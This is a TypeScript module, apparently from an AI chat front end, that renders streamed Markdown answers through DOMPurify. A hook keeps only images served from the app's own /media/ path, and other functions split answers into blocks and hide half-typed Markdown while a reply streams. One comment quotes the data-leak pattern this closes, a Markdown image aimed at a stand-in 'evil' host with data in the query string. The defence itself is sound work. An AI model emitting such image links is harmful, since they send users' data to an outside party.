import DOMPurify from 'dompurify'
import hljs from 'highlight.js/lib/common'
import { Marked } from 'marked'
import { markedHighlight } from 'marked-highlight'

import { MEDIA_ORIGIN } from '../config'

const MEDIA_PATH = /^\/media\/[\w.-]+$/ // /media/<file name>: nothing else is ever loaded

// The finished blocks get syntax highlighting. The block that is still being typed does not:
// highlighting a growing code block on every frame is the most expensive part of the render.
const highlighted = new Marked(
  markedHighlight({
    langPrefix: 'hljs language-',
    highlight(code, lang) {
      const language = hljs.getLanguage(lang) ? lang : 'plaintext'
      return hljs.highlight(code, { language }).value
    },
  }),
)
const plain = new Marked()

// Pictures only from our backend: this closes the leak of data through ![](https://evil/?q=...).
// The model often "improves" the address it got from the tool (it adds a made-up domain to
// "/media/x.jpg"), so only the PATH is trusted: the address is rebuilt from it on our own origin.
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'IMG') {
    let path = ''
    try {
      path = new URL(node.getAttribute('src') || '', window.location.href).pathname
    } catch {
      /* not a URL at all */
    }
    if (!MEDIA_PATH.test(path)) {
      node.parentNode?.removeChild(node)
      return
    }
    node.setAttribute('src', `${MEDIA_ORIGIN}${path}`) // host, query and fragment are dropped
    node.setAttribute('loading', 'lazy')
    node.setAttribute('referrerpolicy', 'no-referrer')
  }
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank')
    node.setAttribute('rel', 'noopener noreferrer')
  }
})

/** the only place where Markdown becomes HTML */
export function renderMarkdown(md: string, { highlight = true } = {}): string {
  const html = (highlight ? highlighted : plain).parse(md, { async: false })
  return DOMPurify.sanitize(html, { USE_PROFILES: { html: true } })
}

/**
 * Splits Markdown into top-level blocks (paragraphs, lists, code blocks, tables...).
 *
 * While an answer streams only the LAST block changes, so every other block is rendered once
 * and memoised (components/Markdown.tsx). Re-parsing and re-writing the whole answer on every
 * frame makes the cost grow with the length of the answer and makes the pictures blink.
 */
export function splitBlocks(md: string): string[] {
  const blocks: string[] = []
  for (const token of plain.lexer(md)) {
    // blank lines between blocks: glued to the previous block, so they never form a block of their own
    if (token.type === 'space' && blocks.length) blocks[blocks.length - 1] += token.raw
    else blocks.push(token.raw)
  }
  return blocks
}

/**
 * Hides Markdown that is only half typed in the tail of a streaming answer, so the visitor does
 * not see "**", "![](/med" or "[link](htt" for a frame before it turns into formatting.
 * Only the visible text is changed: the next frame renders the real text again.
 */
export function trimIncompleteTail(md: string): string {
  if (/^ {0,3}(```|~~~)/.test(md)) return md // inside a code block every character is literal

  // an image or a link whose address has not arrived yet
  const bracket = md.lastIndexOf('[')
  if (bracket !== -1) {
    const start = md[bracket - 1] === '!' ? bracket - 1 : bracket
    const rest = md.slice(start)
    const closed = /\]\([^)]*\)/.test(rest)
    // "[text" alone may be plain text in brackets: it is hidden only once it looks like a link
    if (!closed && (rest.startsWith('![') || rest.includes(']('))) md = md.slice(0, start)
  }
  // a dangling emphasis marker at the very end ("some **", "some *", "`")
  return md.replace(/(\*{1,3}|_{1,3}|`{1,2}|~~)$/, '')
}
